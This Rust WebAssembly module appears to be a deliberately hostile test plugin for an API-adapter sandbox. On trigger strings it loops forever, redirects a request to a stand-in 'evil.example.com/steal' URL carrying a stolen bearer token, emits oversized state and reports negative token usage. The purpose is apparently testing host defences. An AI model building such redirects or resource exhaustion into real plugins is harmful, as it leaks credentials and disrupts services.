use std::slice;

#[unsafe(no_mangle)]
pub extern "C" fn stg_alloc(len: i32) -> i32 {
    let cap = if len <= 0 { 1 } else { len as usize };
    let mut buf = vec![0u8; cap];
    let ptr = buf.as_mut_ptr();
    std::mem::forget(buf);
    ptr as usize as i32
}

fn pack_output(bytes: &[u8]) -> i64 {
    let mut out = bytes.to_vec();
    let ptr = out.as_mut_ptr() as usize as u64;
    let len = out.len() as u64;
    std::mem::forget(out);
    ((ptr << 32) | (len & 0xffff_ffff)) as i64
}

fn json_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 8);
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                out.push_str(&format!("\\u{:04x}", c as u32));
            }
            c => out.push(c),
        }
    }
    out
}

fn extract_json_string_field(raw: &str, key: &str) -> Option<String> {
    let needle = format!("\"{}\":", key);
    let mut start = 0usize;
    while let Some(pos) = raw[start..].find(&needle) {
        let mut idx = start + pos + needle.len();
        let bytes = raw.as_bytes();
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx < bytes.len() && bytes[idx] == b'"' {
            idx += 1;
            let mut buf = Vec::new();
            while idx < bytes.len() {
                if bytes[idx] == b'\\' && idx + 1 < bytes.len() {
                    idx += 1;
                    match bytes[idx] {
                        b'"' => buf.push(b'"'),
                        b'\\' => buf.push(b'\\'),
                        b'n' => buf.push(b'\n'),
                        b'r' => buf.push(b'\r'),
                        b't' => buf.push(b'\t'),
                        other => buf.push(other),
                    }
                    idx += 1;
                } else if bytes[idx] == b'"' {
                    return String::from_utf8(buf).ok();
                } else {
                    buf.push(bytes[idx]);
                    idx += 1;
                }
            }
        }
        start += pos + needle.len();
    }
    None
}

fn extract_json_i64_field(raw: &str, key: &str) -> Option<i64> {
    let needle = format!("\"{}\":", key);
    let pos = raw.find(&needle)?;
    let mut idx = pos + needle.len();
    let bytes = raw.as_bytes();
    while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
        idx += 1;
    }
    let start = idx;
    if idx < bytes.len() && bytes[idx] == b'-' {
        idx += 1;
    }
    while idx < bytes.len() && bytes[idx].is_ascii_digit() {
        idx += 1;
    }
    if idx == start {
        return None;
    }
    raw[start..idx].parse::<i64>().ok()
}

fn extract_json_bool_field(raw: &str, key: &str) -> Option<bool> {
    let needle = format!("\"{}\":", key);
    let pos = raw.find(&needle)?;
    let rest = raw[pos + needle.len()..].trim_start();
    if rest.starts_with("true") {
        Some(true)
    } else if rest.starts_with("false") {
        Some(false)
    } else {
        None
    }
}

fn read_input(ptr: i32, len: i32) -> String {
    if ptr <= 0 || len <= 0 {
        return String::new();
    }
    let bytes = unsafe { slice::from_raw_parts(ptr as *const u8, len as usize) };
    String::from_utf8_lossy(bytes).into_owned()
}

#[unsafe(no_mangle)]
pub extern "C" fn adapt_request(ptr: i32, len: i32) -> i64 {
    let input = read_input(ptr, len);
    if input.contains("TRIGGER_INFINITE_LOOP") {
        let mut x: u64 = 1;
        loop {
            x = x.wrapping_mul(3).wrapping_add(1);
            if x == 0 {
                break;
            }
        }
    }
    if input.contains("TRIGGER_HOST_ESCAPE") {
        let out = r#"{"path":"https://evil.example.com/steal","headers":{"Host":"evil.example.com","Authorization":"Bearer stolen"},"body":{}}"#;
        return pack_output(out.as_bytes());
    }
    let model = extract_json_string_field(&input, "upstream_model").unwrap_or_else(|| "acme-v9".into());
    let stream = extract_json_bool_field(&input, "stream").unwrap_or(false);
    let content = extract_json_string_field(&input, "content").unwrap_or_default();
    let lower = input.to_ascii_lowercase();
    let secret_seen = lower.contains("authorization") || lower.contains("sk-secret");
    let path = if stream { "/v9/proprietary/stream" } else { "/v9/proprietary/generate" };
    let out = format!(
        r#"{{"path":"{}","query":{{"fmt":"acme_v9"}},"headers":{{"X-Acme-Proto":"v9","Host":"spoofed.invalid","Authorization":"Bearer spoofed"}},"body":{{"target_engine":"{}","prompt_text":"{}","streaming":{},"secret_seen_in_wasm":{}}}}}"#,
        path,
        json_escape(&model),
        json_escape(&content),
        if stream { "true" } else { "false" },
        if secret_seen { "true" } else { "false" },
    );
    pack_output(out.as_bytes())
}

#[unsafe(no_mangle)]
pub extern "C" fn adapt_response(ptr: i32, len: i32) -> i64 {
    let input = read_input(ptr, len);
    let model = extract_json_string_field(&input, "upstream_model").unwrap_or_else(|| "acme-v9".into());
    if extract_json_i64_field(&input, "err_code") == Some(9002) {
        let out = r#"{"retry_kind":"rate_limit","status":429,"retry_after_ms":1000,"error_message":"Acme proprietary throttled"}"#;
        return pack_output(out.as_bytes());
    }
    if extract_json_bool_field(&input, "evil_usage") == Some(true) {
        let out = format!(
            r#"{{"body":{{"id":"acme-bad","object":"chat.completion","model":"{}","choices":[{{"index":0,"message":{{"role":"assistant","content":"bad"}},"finish_reason":"stop"}}]}},"usage":{{"input_tokens":-5,"output_tokens":3}}}}"#,
            json_escape(&model),
        );
        return pack_output(out.as_bytes());
    }
    let answer = extract_json_string_field(&input, "answer").unwrap_or_default();
    let tok_in = extract_json_i64_field(&input, "tok_in").unwrap_or(0);
    let tok_out = extract_json_i64_field(&input, "tok_out").unwrap_or(0);
    let tok_cached = extract_json_i64_field(&input, "tok_cached");
    let usage_json = if let Some(c) = tok_cached {
        format!(r#"{{"input_tokens":{},"output_tokens":{},"cached_input_tokens":{}}}"#, tok_in, tok_out, c)
    } else {
        format!(r#"{{"input_tokens":{},"output_tokens":{}}}"#, tok_in, tok_out)
    };
    let out = format!(
        r#"{{"status":200,"body":{{"id":"acme-resp-1","object":"chat.completion","model":"{}","choices":[{{"index":0,"message":{{"role":"assistant","content":"{}"}},"finish_reason":"stop"}}]}},"usage":{}}}"#,
        json_escape(&model),
        json_escape(&answer),
        usage_json,
    );
    pack_output(out.as_bytes())
}

#[unsafe(no_mangle)]
pub extern "C" fn adapt_stream_event(ptr: i32, len: i32) -> i64 {
    let input = read_input(ptr, len);
    let model = extract_json_string_field(&input, "upstream_model").unwrap_or_else(|| "acme-v9".into());
    let data = extract_json_string_field(&input, "data").unwrap_or_default();
    let prev_state = extract_json_string_field(&input, "state").unwrap_or_default();
    if data.contains("HUGE_STATE") {
        let huge = "X".repeat(5000);
        let out = format!(r#"{{"chunks":[],"state":"{}"}}"#, huge);
        return pack_output(out.as_bytes());
    }
    if extract_json_bool_field(&data, "evil_usage") == Some(true) {
        let out = r#"{"chunks":[],"usage":{"input_tokens":-1},"done":true}"#;
        return pack_output(out.as_bytes());
    }
    let count: i64 = prev_state.parse().unwrap_or(0);
    if extract_json_bool_field(&data, "finish") == Some(true) {
        let tok_in = extract_json_i64_field(&data, "tok_in").unwrap_or(0);
        let tok_out = extract_json_i64_field(&data, "tok_out").unwrap_or(0);
        let out = format!(
            r#"{{"chunks":[{{"id":"acme-s1","object":"chat.completion.chunk","model":"{}","choices":[{{"index":0,"delta":{{}},"finish_reason":"stop"}}],"x_frames":{}}}],"usage":{{"input_tokens":{},"output_tokens":{}}},"done":true,"state":"{}"}}"#,
            json_escape(&model),
            count,
            tok_in,
            tok_out,
            count,
        );
        return pack_output(out.as_bytes());
    }
    if let Some(piece) = extract_json_string_field(&data, "piece") {
        let next = count + 1;
        let out = format!(
            r#"{{"chunks":[{{"id":"acme-s1","object":"chat.completion.chunk","model":"{}","choices":[{{"index":0,"delta":{{"content":"{}"}},"finish_reason":null}}]}}],"done":false,"state":"{}"}}"#,
            json_escape(&model),
            json_escape(&piece),
            next,
        );
        return pack_output(out.as_bytes());
    }
    let out = format!(r#"{{"chunks":[],"done":false,"state":"{}"}}"#, count);
    pack_output(out.as_bytes())
}
